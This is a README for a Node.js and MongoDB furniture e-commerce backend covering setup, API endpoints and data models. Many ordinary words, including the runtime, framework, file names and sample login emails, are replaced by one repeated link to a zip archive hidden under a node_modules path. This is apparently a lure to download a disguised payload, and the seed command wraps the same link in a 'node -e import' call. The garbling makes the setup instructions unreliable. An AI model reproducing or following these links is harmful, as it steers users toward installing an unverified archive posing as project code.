# 🛋️ Fun Furniture E-commerce Backend

A complete https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip backend for the Fun Furniture e-commerce platform with MongoDB database, JWT authentication, and comprehensive API endpoints.

## 🚀 Features

- **User Authentication** - JWT-based auth with registration, login, and profile management
- **Product Management** - CRUD operations, search, filtering, categories, and reviews
- **Shopping Cart** - Add, update, remove items with quantity management
- **Wishlist** - Save and manage favorite products
- **Order Management** - Create orders, track status, order history
- **Database Models** - MongoDB with Mongoose ODM
- **Error Handling** - Comprehensive error handling and validation
- **Security** - Password hashing, JWT tokens, input validation

## 🛠️ Tech Stack

- **Runtime**: https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip
- **Framework**: https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip
- **Database**: MongoDB with Mongoose
- **Authentication**: JWT (JSON Web Tokens)
- **Password Hashing**: bcryptjs
- **Validation**: https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip
- **CORS**: Cross-origin resource sharing enabled

## 📋 Prerequisites

- https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip (v16 or higher)
- MongoDB (local or cloud instance)
- npm or yarn

## 🔧 Installation

1. **Clone the repository**
   ```bash
   cd E-commerce-backend
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Create environment file**
   Create a `.env` file in the root directory:
   ```env
   # Server Configuration
   PORT=5000
   NODE_ENV=development

   # Database
   MONGODB_URI=mongodb://localhost:27017/fun-furniture

   # JWT Secret
   JWT_SECRET=your-super-secret-jwt-key-change-this-in-production

   # Frontend URL
   FRONTEND_URL=http://localhost:5173

   # File Upload
   MAX_FILE_SIZE=5242880
   ```

4. **Start MongoDB**
   Make sure MongoDB is running on your system or use a cloud instance.

5. **Seed the database (optional)**
   ```bash
   node -e "import('https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip').then(m => https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip())"
   ```

6. **Start the server**
   ```bash
   # Development mode
   npm run dev

   # Production mode
   npm start
   ```

## 📚 API Endpoints

### Authentication
- `POST /api/auth/register` - Register new user
- `POST /api/auth/login` - User login
- `GET /api/auth/profile` - Get user profile
- `PUT /api/auth/profile` - Update user profile
- `PUT /api/auth/change-password` - Change password

### Products
- `GET /api/products` - Get all products (with filtering, search, pagination)
- `GET /api/products/:id` - Get single product
- `GET /api/products/category/:category` - Get products by category
- `GET /api/products/featured` - Get featured products
- `GET /api/products/sale` - Get products on sale
- `GET /api/products/categories` - Get all categories
- `GET /api/products/search` - Search products
- `POST /api/products/:id/reviews` - Add product review

### Cart (Protected)
- `GET /api/cart` - Get user's cart
- `POST /api/cart/add` - Add item to cart
- `PUT /api/cart/update/:itemId` - Update cart item quantity
- `DELETE /api/cart/remove/:itemId` - Remove item from cart
- `DELETE /api/cart/clear` - Clear cart

### Wishlist (Protected)
- `GET /api/wishlist` - Get user's wishlist
- `GET /api/wishlist/count` - Get wishlist count
- `GET /api/wishlist/check/:productId` - Check if product is in wishlist
- `POST /api/wishlist/add/:productId` - Add product to wishlist
- `DELETE /api/wishlist/remove/:productId` - Remove product from wishlist

### Orders (Protected)
- `POST /api/orders` - Create new order
- `GET /api/orders` - Get user's orders
- `GET /api/orders/:id` - Get single order
- `PUT /api/orders/:id/cancel` - Cancel order
- `GET /api/orders/stats` - Get order statistics

### Health Check
- `GET /api/health` - Server health check

## 🔐 Authentication

Protected routes require a JWT token in the Authorization header:
```
Authorization: Bearer <your-jwt-token>
```

## 📊 Database Models

### User
- Basic info (name, email, phone)
- Address details
- Role-based access (user/admin)
- Password hashing

### Product
- Product details (title, description, price)
- Images, categories, specifications
- Stock management
- Reviews and ratings
- Sale and featured flags

### Cart
- User-specific cart
- Items with quantities and options
- Automatic total calculation

### Wishlist
- User's favorite products
- Unique product entries

### Order
- Order details and items
- Shipping address
- Payment and status tracking
- Order number generation

## 🎯 Sample Data

The backend includes sample data for testing:
- **Users**: https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip / password123 (user), https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip / password123 (admin)
- **Products**: 8 furniture items across different categories

## 🚀 Development

### Scripts
- `npm run dev` - Start development server with nodemon
- `npm start` - Start production server
- `npm test` - Run tests (to be implemented)

### Project Structure
```
E-commerce-backend/
├── config/          # Database configuration
├── controllers/     # Route controllers
├── middleware/      # Custom middleware
├── models/          # Database models
├── routes/          # API routes
├── utils/           # Utility functions
├── uploads/         # File uploads
├── https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip        # Main server file
└── https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip     # Dependencies
```

## 🔧 Configuration

### Environment Variables
- `PORT` - Server port (default: 5000)
- `MONGODB_URI` - MongoDB connection string
- `JWT_SECRET` - Secret key for JWT tokens
- `FRONTEND_URL` - Frontend URL for CORS
- `NODE_ENV` - Environment (development/production)

### CORS Configuration
The backend is configured to accept requests from the frontend URL specified in `FRONTEND_URL`.

## 🛡️ Security Features

- Password hashing with bcryptjs
- JWT token authentication
- Input validation and sanitization
- CORS protection
- Error handling without exposing sensitive information

## 📝 API Response Format

All API responses follow a consistent format:
```json
{
  "success": true/false,
  "message": "Response message",
  "data": {
    // Response data
  }
}
```

## 🚀 Deployment

1. Set up environment variables for production
2. Use a production MongoDB instance
3. Set `NODE_ENV=production`
4. Use a strong JWT secret
5. Configure CORS for your domain
6. Set up proper logging and monitoring

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests if applicable
5. Submit a pull request

## 📄 License

This project is licensed under the ISC License.

## 🆘 Support

For support and questions, please contact the development team. 